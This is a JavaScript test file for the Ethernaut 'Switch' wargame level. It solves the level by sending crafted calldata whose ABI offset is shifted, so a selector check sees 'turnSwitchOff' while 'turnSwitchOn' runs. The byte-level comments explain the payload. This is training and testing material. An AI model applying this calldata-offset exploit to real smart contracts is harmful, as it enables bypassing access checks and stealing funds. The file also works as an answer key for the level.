const SwitchFactory = artifacts.require('SwitchFactory')
const Switch = artifacts.require('Switch')

const utils = require('../utils/TestUtils')

contract('Switch', function ([player]) {
  let ethernaut
  let level

  before(async function () {
    ethernaut = await utils.getEthernautWithStatsProxy()
    level = await SwitchFactory.new()
    await ethernaut.registerLevel(level.address)
  })

  it('should submit level instance successfully', async function () {
    const instance = await utils.createLevelInstance(ethernaut, level.address, player, Switch, {
      from: player,
    })

    // turnSwitchOff selector: 0x20606e15
    // turnSwitchOn selector: 0x76227e12

    // Original CALLDATA
    //  4 Bytes                            32 Bytes                                                          32 Bytes                                                            32 Bytes
    // "flipSwitch(bytes)"             32 (1 slot offset)                                                        4                                                              0x20606e15
    // 0x30c13ade 0000000000000000000000000000000000000000000000000000000000000020 0000000000000000000000000000000000000000000000000000000000000004 20606e1500000000000000000000000000000000000000000000000000000000

    // Exploited CALLDATA with "turnSwitchOn()" payload in the end
    //  4 Bytes                            32 Bytes                                                          32 Bytes                                                            32 Bytes                                                       32 Bytes                                                           32 Bytes
    // "flipSwitch(bytes)"           96 (!3 slots offset!)                                                       4                                                              0x20606e15                                                          4                                                             0x76227e12
    // 0x30c13ade 0000000000000000000000000000000000000000000000000000000000000060 0000000000000000000000000000000000000000000000000000000000000004 20606e1500000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000004 76227e1200000000000000000000000000000000000000000000000000000000
    const calldata =
      '0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000'
    await web3.eth.sendTransaction({
      from: player,
      to: instance.address,
      data: calldata,
    })

    const completed = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player,
    )
    assert.isTrue(completed)
  })
})
